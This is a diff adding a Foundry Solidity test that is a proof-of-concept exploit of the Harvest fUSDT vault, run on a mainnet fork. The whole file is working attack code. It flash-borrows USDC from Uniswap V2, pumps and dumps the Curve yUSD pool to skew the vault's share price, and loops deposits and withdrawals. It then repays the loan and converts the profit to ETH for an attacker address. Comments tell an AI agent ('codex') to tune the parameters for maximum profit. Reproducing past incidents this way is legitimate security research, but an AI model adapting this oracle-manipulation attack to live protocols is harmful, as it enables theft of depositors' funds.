@@ -1,0 +1,253 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.23;
+
+import "forge-std/Test.sol";
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Minimal local interfaces — Harvest oracle-manipulation PoC.
+// Strategy: flash-swap USDC from a Uniswap V2 pair (no up-front capital),
+// pump/dump Curve yUSD pool to skew USDT spot price, then deposit/withdraw
+// Harvest fUSDT vault per iteration. Repay the flash-swap at the end.
+// Finally convert USDT profit → WETH → native ETH.
+// ─────────────────────────────────────────────────────────────────────────────
+
+interface IERC20 {
+    function balanceOf(address) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function decimals() external view returns (uint8);
+}
+
+interface IWETH is IERC20 {
+    function withdraw(uint256) external;
+    function deposit() external payable;
+}
+
+interface IUniswapV2Pair {
+    function getReserves() external view returns (uint112 r0, uint112 r1, uint32 ts);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+}
+
+interface IUniswapV2Router {
+    function swapExactTokensForTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory);
+}
+
+interface IUniswapV3Router {
+    struct ExactInputSingleParams {
+        address tokenIn;
+        address tokenOut;
+        uint24  fee;
+        address recipient;
+        uint256 deadline;
+        uint256 amountIn;
+        uint256 amountOutMinimum;
+        uint160 sqrtPriceLimitX96;
+    }
+    function exactInputSingle(ExactInputSingleParams calldata) external payable returns (uint256 amountOut);
+}
+
+interface ICurvePool {
+    // yCurve underlying exchange — uses int128 indices (USDC=1, USDT=2).
+    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
+    function get_dy_underlying(int128 i, int128 j, uint256 dx) external view returns (uint256);
+}
+
+interface IHVault {
+    function deposit(uint256 amount) external;
+    function withdraw(uint256 numberOfShares) external;
+    function balanceOf(address) external view returns (uint256);
+    function getPricePerFullShare() external view returns (uint256);
+    function underlying() external view returns (address);
+}
+
+interface IStrategy {
+    function investedUnderlyingBalance() external view returns (uint256);
+}
+
+contract HarvestExploitTest is Test {
+    // ── Addresses (Ethereum mainnet fork) ─────────────────────────────
+    // Verified from knowledge/case_harvest.md:
+    IHVault   constant FUSDT_VAULT    = IHVault(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
+    ICurvePool constant CURVE_YPOOL   = ICurvePool(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
+    IERC20    constant USDT           = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
+    IERC20    constant USDC           = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+    IWETH     constant WETH           = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IUniswapV3Router constant UNIV3   = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+
+    // UniswapV2 USDC/USDT pair used as the flash-swap provider (fee = 0.30%).
+    // TODO[codex]: pick the highest-liquidity pair; confirm token0/token1 order.
+    IUniswapV2Pair constant FLASH_PAIR = IUniswapV2Pair(0x3041CbD36888bECc7bbCBc0045E3B1f144466f5f);
+
+    // Curve yUSD underlying indices.
+    int128 constant IDX_DAI  = 0;
+    int128 constant IDX_USDC = 1;
+    int128 constant IDX_USDT = 2;
+    int128 constant IDX_TUSD = 3;
+
+    // ── Setup ────────────────────────────────────────────────────────
+    address attacker = vm.addr(uint256(keccak256("attacker")));
+    uint256 constant FORK_BLOCK = 11128633; // per knowledge/case_harvest.md
+
+    // Exploit knobs — Codex tunes these via `tune` tasks.
+    // TODO[codex]: start with (ITER=17, SWAP_SIZE=50_000_000e6, DEPOSIT=50_000_000e6)
+    //              then binary-search around each for maximum ETH delta.
+    uint256 iter        = 17;
+    uint256 swapSize    = 50_000_000 * 1e6;   // USDC per pump, just under ±3% guard
+    uint256 depositAmt  = 50_000_000 * 1e6;   // USDT per fUSDT deposit
+
+    // Flash-swap borrow size (USDC).
+    uint256 flashAmount = 200_000_000 * 1e6;
+
+    function setUp() public {
+        vm.createSelectFork("ch2", FORK_BLOCK);
+        vm.deal(attacker, 1 ether); // gas only
+    }
+
+    // ── Hypothesis test ──────────────────────────────────────────────
+    function test_exploit() public {
+        uint256 balBefore = attacker.balance;
+        console.log("ATTACKER_NATIVE_BEFORE:", balBefore);
+
+        vm.startPrank(attacker);
+
+        // Kick off flash-swap — the UniswapV2 pair will call back into `uniswapV2Call`.
+        _flashBorrow(flashAmount);
+
+        // After callback completes we should hold leftover USDT + USDC.
+        _swapStablesToEth();
+
+        vm.stopPrank();
+
+        uint256 balAfter = attacker.balance;
+        console.log("ATTACKER_NATIVE_AFTER:", balAfter);
+        console.log("ATTACKER_NATIVE_DELTA:", balAfter - balBefore);
+        assertGt(balAfter, balBefore, "native balance must strictly increase");
+    }
+
+    // ─────────────────────────────────────────────────────────────────
+    // Helpers
+    // ─────────────────────────────────────────────────────────────────
+
+    /// @dev Trigger a UniswapV2 flash-swap from FLASH_PAIR.
+    ///      We borrow USDC by asking for (amount0Out = X, amount1Out = 0) — Codex must
+    ///      verify FLASH_PAIR.token0() == USDC (swap direction).
+    function _flashBorrow(uint256 amountUSDC) internal {
+        // TODO[codex]: verify pair orientation and flip the args if token1 == USDC.
+        bytes memory data = abi.encode(amountUSDC);
+        FLASH_PAIR.swap(amountUSDC, 0, address(this), data);
+    }
+
+    /// @dev UniswapV2 flash-swap callback — executed mid-swap by FLASH_PAIR.
+    function uniswapV2Call(
+        address sender,
+        uint256 amount0,
+        uint256 amount1,
+        bytes calldata data
+    ) external {
+        require(msg.sender == address(FLASH_PAIR), "bad pair");
+        require(sender == address(this), "bad sender");
+
+        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
+
+        // ── The oracle-manipulation loop ──────────────────────────────
+        // TODO[codex]: approvals (USDT/USDC are funky: USDT has no return value).
+        // Use (bool ok,) = token.call(abi.encodeWithSelector(...)) if needed.
+        _approveAll();
+
+        for (uint256 i = 0; i < iter; ++i) {
+            // a) pump: swap USDC → USDT on yCurve (USDT price ↑)
+            CURVE_YPOOL.exchange_underlying(IDX_USDC, IDX_USDT, swapSize, 0);
+
+            // b) deposit: mint inflated fUSDT shares
+            FUSDT_VAULT.deposit(depositAmt);
+
+            // c) dump: swap USDT → USDC (pool restored, small curve-fee cost)
+            CURVE_YPOOL.exchange_underlying(IDX_USDT, IDX_USDC, swapSize, 0);
+
+            // d) withdraw: burn shares at normal price → more USDT than deposited
+            FUSDT_VAULT.withdraw(FUSDT_VAULT.balanceOf(address(this)));
+        }
+
+        // ── Repay flash-swap ──────────────────────────────────────────
+        // UniswapV2 fee = 0.3% → owe ceil(borrowed * 1000 / 997).
+        uint256 repay = (borrowed * 1000) / 997 + 1;
+        USDC.transfer(address(FLASH_PAIR), repay);
+
+        // Forward the USDT profit to the attacker EOA so test_exploit can cash out.
+        USDT.transfer(attacker, USDT.balanceOf(address(this)));
+        // Residual USDC (if any) too.
+        uint256 leftUSDC = USDC.balanceOf(address(this));
+        if (leftUSDC > 0) USDC.transfer(attacker, leftUSDC);
+    }
+
+    /// @dev Convert all USDT (and residual USDC) on attacker → WETH → native ETH.
+    function _swapStablesToEth() internal {
+        uint256 usdtBal = USDT.balanceOf(attacker);
+        if (usdtBal > 0) {
+            // USDT has no return value on approve → force-low-level call.
+            (bool ok, ) = address(USDT).call(
+                abi.encodeWithSelector(IERC20.approve.selector, address(UNIV3), usdtBal)
+            );
+            require(ok, "usdt approve");
+            UNIV3.exactInputSingle(IUniswapV3Router.ExactInputSingleParams({
+                tokenIn:           address(USDT),
+                tokenOut:          address(WETH),
+                fee:               500, // 0.05% USDT/WETH tier
+                recipient:         address(this),
+                deadline:          block.timestamp + 60,
+                amountIn:          usdtBal,
+                amountOutMinimum:  0,
+                sqrtPriceLimitX96: 0
+            }));
+        }
+        uint256 usdcBal = USDC.balanceOf(attacker);
+        if (usdcBal > 0) {
+            USDC.approve(address(UNIV3), usdcBal);
+            UNIV3.exactInputSingle(IUniswapV3Router.ExactInputSingleParams({
+                tokenIn:           address(USDC),
+                tokenOut:          address(WETH),
+                fee:               500,
+                recipient:         address(this),
+                deadline:          block.timestamp + 60,
+                amountIn:          usdcBal,
+                amountOutMinimum:  0,
+                sqrtPriceLimitX96: 0
+            }));
+        }
+        uint256 wethBal = WETH.balanceOf(address(this));
+        if (wethBal > 0) {
+            WETH.withdraw(wethBal);
+            (bool ok, ) = attacker.call{value: wethBal}("");
+            require(ok, "fwd eth");
+        }
+    }
+
+    function _approveAll() internal {
+        // USDC is well-behaved.
+        USDC.approve(address(CURVE_YPOOL), type(uint256).max);
+        USDC.approve(address(FUSDT_VAULT), type(uint256).max);
+        // USDT needs the low-level approve dance on mainnet.
+        (bool a, ) = address(USDT).call(abi.encodeWithSelector(IERC20.approve.selector, address(CURVE_YPOOL), type(uint256).max));
+        (bool b, ) = address(USDT).call(abi.encodeWithSelector(IERC20.approve.selector, address(FUSDT_VAULT), type(uint256).max));
+        require(a && b, "usdt approves");
+    }
+
+    // Required to receive unwrapped ETH from WETH.withdraw.
+    receive() external payable {}
+
+    /// @notice Hypothesis: Harvest's fUSDT vault derives share price from
+    ///         Curve yUSD's `calc_withdraw_one_coin`, a spot-price oracle.
+    ///         An attacker can pump/dump USDC↔USDT inside the ±3% arbitrage
+    ///         guard, deposit+withdraw per iteration for a risk-free delta,
+    ///         and compound that over N iterations. Flash-swapped USDC funds
+    ///         the swap capital; iteration count and swap size are tuned.
+    ///         Final step: USDT/USDC → WETH (UniV3 0.05%) → native ETH.
+}
